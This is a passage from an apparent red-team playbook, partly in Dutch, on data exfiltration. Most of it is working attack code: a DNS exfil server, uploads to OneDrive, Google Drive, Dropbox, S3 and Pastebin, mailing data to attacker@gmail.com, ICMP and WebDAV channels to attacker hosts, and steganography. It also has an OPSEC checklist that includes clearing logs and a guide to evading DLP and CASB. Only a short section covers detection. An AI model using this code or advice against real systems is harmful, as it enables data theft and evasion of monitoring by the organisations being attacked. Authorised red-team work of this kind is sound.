=60))
        return reply
    
    def save_data(self, output_file):
        """Reassemble and save data"""
        if not self.data_chunks:
            print("[-] No data received")
            return
        
        # Sort by sequence number
        sorted_chunks = sorted(self.data_chunks.items())
        combined = ''.join([chunk for _, chunk in sorted_chunks])
        
        # Restore Base64 characters
        combined = combined.replace('-', '+').replace('_', '/')
        
        # Add padding if needed
        padding = 4 - len(combined) % 4
        if padding != 4:
            combined += '=' * padding
        
        # Decode and save
        try:
            decoded = base64.b64decode(combined)
            with open(output_file, 'wb') as f:
                f.write(decoded)
            print(f"[+] Saved {len(decoded)} bytes to {output_file}")
        except Exception as e:
            print(f"[-] Error decoding: {e}")

if __name__ == '__main__':
    domain = "data.attacker.com"
    resolver = ExfilResolver(domain)
    
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    print(f"[*] DNS exfil server listening on port 53")
    print(f"[*] Domain: {domain}")
    
    try:
        server.start()
        while True:
            input("Press Enter to save data (Ctrl+C to quit)...")
            resolver.save_data("exfil_data.bin")
    except KeyboardInterrupt:
        server.stop()
        resolver.save_data("exfil_data.bin")
```

> **📘 SENIOR INSIGHT:**
> **DNS exfil is TRAAG maar STEALTHY:**
> - ~50 bytes per query (label limit)
> - 1MB file = ~20,000 queries
> - Detectie: DNS analytics, query volume anomalies
> - Goed voor: Small files, credentials, keys

---

# 5. CLOUD SERVICE ABUSE

## 5.1 OneDrive/SharePoint Exfiltration

```powershell
# === ONEDRIVE EXFILTRATION ===
# Abuse existing OneDrive sync or Graph API

# If OneDrive sync is configured:
# Simply copy files to OneDrive folder!
$oneDrivePath = "$env:USERPROFILE\OneDrive"
if (Test-Path $oneDrivePath) {
    Copy-Item "C:\sensitive\data.xlsx" "$oneDrivePath\data.xlsx"
    Write-Host "[+] File will sync automatically to attacker-controlled account"
}

# Using Microsoft Graph API (requires token)
function Invoke-GraphExfil {
    param(
        [string]$AccessToken,
        [string]$FilePath
    )
    
    $fileName = Split-Path $FilePath -Leaf
    $fileContent = [IO.File]::ReadAllBytes($FilePath)
    
    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type" = "application/octet-stream"
    }
    
    # Upload to OneDrive
    $uri = "https://graph.microsoft.com/v1.0/me/drive/root:/$fileName`:/content"
    
    Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $fileContent
    
    Write-Host "[+] File uploaded to OneDrive"
}
```

---

## 5.2 Google Drive Exfiltration

```python
#!/usr/bin/env python3
"""
gdrive_exfil.py
Upload files to Google Drive
"""

from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

def upload_to_gdrive(file_path: str, credentials_json: str):
    """Upload file to Google Drive"""
    
    creds = Credentials.from_authorized_user_file(credentials_json)
    service = build('drive', 'v3', credentials=creds)
    
    file_metadata = {'name': file_path.split('/')[-1]}
    media = MediaFileUpload(file_path, resumable=True)
    
    file = service.files().create(
        body=file_metadata,
        media_body=media,
        fields='id'
    ).execute()
    
    print(f"[+] Uploaded with ID: {file.get('id')}")
    return file.get('id')

# For red team: Create a Google Cloud project, get OAuth credentials
# Pre-authorize with attacker Google account
```

---

## 5.3 Dropbox Exfiltration

```powershell
# === DROPBOX API EXFILTRATION ===

function Invoke-DropboxExfil {
    param(
        [string]$AccessToken,  # Dropbox API token
        [string]$FilePath
    )
    
    $fileName = Split-Path $FilePath -Leaf
    $fileContent = [IO.File]::ReadAllBytes($FilePath)
    
    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = "{`"path`": `"/$fileName`", `"mode`": `"add`"}"
    }
    
    $uri = "https://content.dropboxapi.com/2/files/upload"
    
    Invoke-RestMethod -Uri $uri -Method POST -Headers $headers -Body $fileContent
    
    Write-Host "[+] File uploaded to Dropbox"
}

# Get token: Create Dropbox App, generate access token
```

---

## 5.4 AWS S3 Exfiltration

```powershell
# === AWS S3 EXFILTRATION ===

# Using AWS CLI (if installed)
aws s3 cp "C:\sensitive\data.xlsx" "s3://attacker-bucket/exfil/data.xlsx"

# Using PowerShell with AWS module
Import-Module AWSPowerShell
Set-AWSCredential -AccessKey "AKIA..." -SecretKey "..."
Write-S3Object -BucketName "attacker-bucket" -File "C:\sensitive\data.xlsx" -Key "exfil/data.xlsx"

# Using direct API calls (no tools needed)
function Invoke-S3Exfil {
    param(
        [string]$AccessKey,
        [string]$SecretKey,
        [string]$BucketName,
        [string]$FilePath,
        [string]$Region = "us-east-1"
    )
    
    # AWS Signature V4 implementation required
    # Complex but possible without SDK
}
```

---

## 5.5 Pastebin/File Sharing Sites

```powershell
# === PASTEBIN EXFILTRATION ===
# Quick and dirty for small amounts

function Invoke-PastebinExfil {
    param(
        [string]$Data,
        [string]$ApiKey  # Pastebin API key
    )
    
    $body = @{
        api_dev_key = $ApiKey
        api_option = "paste"
        api_paste_code = $Data
        api_paste_private = 1  # Unlisted
        api_paste_expire_date = "1H"  # Expire in 1 hour
    }
    
    $response = Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body $body
    Write-Host "[+] Paste URL: $($response.Content)"
}

# Alternative services:
# - GitHub Gists (private)
# - Hastebin
# - Ghostbin
# - Transfer.sh
# - File.io (auto-delete after download)
```

---

# 6. EMAIL EXFILTRATION

## 6.1 SMTP Exfiltration

```powershell
# === EMAIL EXFILTRATION ===

# Using .NET SmtpClient
function Send-ExfilEmail {
    param(
        [string]$SmtpServer = "smtp.gmail.com",
        [int]$Port = 587,
        [string]$Username,
        [string]$Password,
        [string]$To,
        [string]$AttachmentPath
    )
    
    $message = New-Object System.Net.Mail.MailMessage
    $message.From = $Username
    $message.To.Add($To)
    $message.Subject = "Report - $(Get-Date -Format 'yyyy-MM-dd')"
    $message.Body = "Please find attached report."
    $message.Attachments.Add((New-Object System.Net.Mail.Attachment($AttachmentPath)))
    
    $smtp = New-Object System.Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtp.EnableSsl = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
    
    $smtp.Send($message)
    Write-Host "[+] Email sent with attachment"
}

# Using Office 365 / Exchange (authenticated user)
Send-MailMessage -From "user@company.com" -To "attacker@gmail.com" `
    -Subject "Report" -Body "Data" -Attachments "C:\data.xlsx" `
    -SmtpServer "smtp.office365.com" -Port 587 -UseSsl `
    -Credential (Get-Credential)
```

---

## 6.2 Outlook/Exchange Exfiltration

```powershell
# === OUTLOOK COM EXFILTRATION ===
# Abuse installed Outlook

$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)  # 0 = Mail item

$mail.To = "attacker@gmail.com"
$mail.Subject = "Report $(Get-Date -Format 'yyyy-MM-dd')"
$mail.Body = "Automated report"
$mail.Attachments.Add("C:\sensitive\data.xlsx")

$mail.Send()

Write-Host "[+] Email sent via Outlook"

# Note: May trigger security prompts
# May be logged by DLP/email security
```

---

# 7. ALTERNATIVE CHANNELS

## 7.1 ICMP Exfiltration

```python
#!/usr/bin/env python3
"""
icmp_exfil.py
Exfiltrate data via ICMP echo requests
"""

import socket
import struct
import base64

def create_icmp_packet(data: bytes, seq: int = 1) -> bytes:
    """Create ICMP echo request with data"""
    
    # ICMP Echo Request
    type_code = 8  # Echo request
    code = 0
    checksum = 0
    identifier = 1337
    sequence = seq
    
    # Header without checksum
    header = struct.pack('!BBHHH', type_code, code, checksum, identifier, sequence)
    
    # Calculate checksum
    packet = header + data
    checksum = calculate_checksum(packet)
    
    # Rebuild with correct checksum
    header = struct.pack('!BBHHH', type_code, code, checksum, identifier, sequence)
    
    return header + data

def calculate_checksum(data: bytes) -> int:
    """Calculate ICMP checksum"""
    if len(data) % 2:
        data += b'\x00'
    
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i+1]
    
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    
    return ~total & 0xFFFF

def exfil_via_icmp(file_path: str, target_ip: str):
    """Exfiltrate file via ICMP"""
    
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Base64 encode
    encoded = base64.b64encode(data)
    
    # Create raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    
    # Split into chunks (max ~1400 bytes for ICMP data)
    chunk_size = 1400
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    print(f"[*] Exfiltrating {len(data)} bytes in {len(chunks)} ICMP packets")
    
    for i, chunk in enumerate(chunks):
        packet = create_icmp_packet(chunk, seq=i)
        sock.sendto(packet, (target_ip, 0))
        print(f"[+] Sent packet {i+1}/{len(chunks)}")
    
    sock.close()

# Note: Requires root/admin to use raw sockets
```

---

## 7.2 WebDAV Exfiltration

```powershell
# === WEBDAV EXFILTRATION ===
# If WebDAV is allowed outbound

# Map WebDAV drive
net use X: https://attacker.com/webdav /user:attacker password

# Copy files
copy "C:\sensitive\data.xlsx" X:\

# Or directly:
copy "C:\sensitive\data.xlsx" "\\attacker.com@SSL\webdav\"

# PowerShell method
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential("user", "pass")
$webclient.UploadFile("https://attacker.com/webdav/data.xlsx", "PUT", "C:\sensitive\data.xlsx")
```

---

## 7.3 Steganography

```python
#!/usr/bin/env python3
"""
stego_exfil.py
Hide data in images using LSB steganography
"""

from PIL import Image
import base64

def hide_data_in_image(image_path: str, data: bytes, output_path: str):
    """Hide data in image using LSB"""
    
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    # Encode data length + data
    encoded = base64.b64encode(data)
    binary = ''.join(format(byte, '08b') for byte in encoded)
    
    # Prepend length (32 bits)
    length_binary = format(len(binary), '032b')
    binary = length_binary + binary
    
    if len(binary) > len(pixels) * 3:
        raise ValueError("Data too large for image")
    
    new_pixels = []
    binary_index = 0
    
    for pixel in pixels:
        new_pixel = list(pixel)
        for i in range(3):  # R, G, B
            if binary_index < len(binary):
                new_pixel[i] = (new_pixel[i] & ~1) | int(binary[binary_index])
                binary_index += 1
        new_pixels.append(tuple(new_pixel))
    
    new_img = Image.new(img.mode, img.size)
    new_img.putdata(new_pixels)
    new_img.save(output_path)
    
    print(f"[+] Data hidden in {output_path}")

def extract_data_from_image(image_path: str) -> bytes:
    """Extract hidden data from image"""
    
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    binary = ''
    for pixel in pixels:
        for i in range(3):
            binary += str(pixel[i] & 1)
    
    # Read length
    length = int(binary[:32], 2)
    
    # Read data
    data_binary = binary[32:32+length]
    
    # Convert to bytes
    bytes_data = bytes(int(data_binary[i:i+8], 2) for i in range(0, len(data_binary), 8))
    
    return base64.b64decode(bytes_data)

# Usage:
# hide_data_in_image("innocent.png", open("secret.txt", "rb").read(), "output.png")
# Post output.png to social media, download elsewhere
```

> **📘 SENIOR INSIGHT:**
> **Steganography is goed voor:**
> - Very small data (keys, passwords)
> - Ultra-covert exfil
> - Bypassing DLP completely
>
> **Nadelen:** Slow, limited capacity, complex

---

# 8. ENCRYPTION & ENCODING

## 8.1 Encryption Before Exfil

```powershell
# === AES ENCRYPTION ===

function Protect-Data {
    param(
        [byte[]]$Data,
        [string]$Password
    )
    
    # Derive key from password
    $salt = [byte[]](1..16)
    $iterations = 10000
    $keySize = 256
    
    $pbkdf2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, $iterations)
    $key = $pbkdf2.GetBytes($keySize / 8)
    $iv = $pbkdf2.GetBytes(16)
    
    # Create AES encryptor
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    $encryptor = $aes.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock($Data, 0, $Data.Length)
    
    $aes.Dispose()
    
    return $encrypted
}

function Unprotect-Data {
    param(
        [byte[]]$EncryptedData,
        [string]$Password
    )
    
    $salt = [byte[]](1..16)
    $iterations = 10000
    $keySize = 256
    
    $pbkdf2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, $iterations)
    $key = $pbkdf2.GetBytes($keySize / 8)
    $iv = $pbkdf2.GetBytes(16)
    
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    $decryptor = $aes.CreateDecryptor()
    $decrypted = $decryptor.TransformFinalBlock($EncryptedData, 0, $EncryptedData.Length)
    
    $aes.Dispose()
    
    return $decrypted
}

# Usage
$data = [IO.File]::ReadAllBytes("C:\sensitive\data.xlsx")
$encrypted = Protect-Data -Data $data -Password "ComplexPassword123!"
[IO.File]::WriteAllBytes("C:\temp\data.enc", $encrypted)
```

---

# 9. OPSEC CONSIDERATIONS

## 9.1 Exfiltration OPSEC Checklist

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    EXFILTRATION OPSEC CHECKLIST                                ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  TIMING                                                                       ║
║  ☐ Exfiltrate during business hours (blends with traffic)                     ║
║  ☐ Avoid off-hours transfers (anomaly)                                        ║
║  ☐ Space out transfers (not bulk)                                             ║
║  ☐ Match normal traffic patterns                                              ║
║                                                                               ║
║  VOLUME                                                                       ║
║  ☐ Throttle bandwidth (don't saturate connection)                             ║
║  ☐ Split large files                                                          ║
║  ☐ Transfer over multiple days if needed                                      ║
║  ☐ Stay under DLP thresholds                                                  ║
║                                                                               ║
║  DESTINATION                                                                  ║
║  ☐ Use categorized/legitimate domains                                         ║
║  ☐ Use cloud services (harder to block)                                       ║
║  ☐ Avoid known bad IPs                                                        ║
║  ☐ Consider geographic routing                                                ║
║                                                                               ║
║  CONTENT                                                                      ║
║  ☐ Encrypt all data (bypass DLP content inspection)                           ║
║  ☐ Use non-obvious file names                                                 ║
║  ☐ Compress to reduce size                                                    ║
║  ☐ Avoid patterns (rotate encoding)                                           ║
║                                                                               ║
║  CLEANUP                                                                      ║
║  ☐ Remove staging files                                                       ║
║  ☐ Clear relevant logs                                                        ║
║  ☐ Remove exfil tools                                                         ║
║  ☐ Document for report                                                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

# 10. DETECTION & COUNTERMEASURES

## 10.1 How Defenders Detect Exfiltration

```yaml
Detection Methods:

Network-Based:
  - Unusual outbound data volumes
  - Connections to uncategorized domains
  - DNS query anomalies (high volume, long queries)
  - Encrypted traffic to suspicious destinations
  - Protocol anomalies (DNS with large payloads)

Endpoint-Based:
  - Mass file access
  - Archive creation (zip, 7z, rar)
  - Encryption of files
  - Unusual process network activity
  - Clipboard monitoring

DLP (Data Loss Prevention):
  - Content inspection (SSN, credit cards, keywords)
  - File type blocking
  - Size limits
  - Destination restrictions

CASB (Cloud Access Security Broker):
  - Unsanctioned cloud app usage
  - Unusual cloud storage uploads
  - Data sharing anomalies
```

## 10.2 Evasion Summary

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    EXFILTRATION EVASION SUMMARY                                ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  DLP Evasion:                                                                 ║
║  → Encrypt data before transfer                                               ║
║  → Use allowed cloud services                                                 ║
║  → Split files under size thresholds                                          ║
║                                                                               ║
║  Network Detection Evasion:                                                   ║
║  → Use HTTPS (encrypted, common)                                              ║
║  → Use legitimate services (OneDrive, Dropbox)                                ║
║  → Throttle bandwidth                                                         ║
║  → Match normal traffic patterns                                              ║
║                                                                               ║
║  DNS Analytics Evasion:                                                       ║
║  → Slow DNS exfil                                                             ║
║  → Use legitimate-looking domain                                              ║
║  → Random delays between queries                                              ║
║                                                                               ║
║  CASB Evasion:                                                                ║
║  → Use sanctioned apps (if available)                                         ║
║  → Use personal accounts carefully                                            ║
║  → Encrypt content                                                            ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

**EINDE DATA EXFILTRATION PLAYBOOK**

---

*Dit document bevat geavanceerde data exfiltration technieken.*
*Alleen te gebruiken binnen ROE-gedefinieerde grenzen.*
*Document altijd bewijs van exfiltratie mogelijkheid voor rapport.*

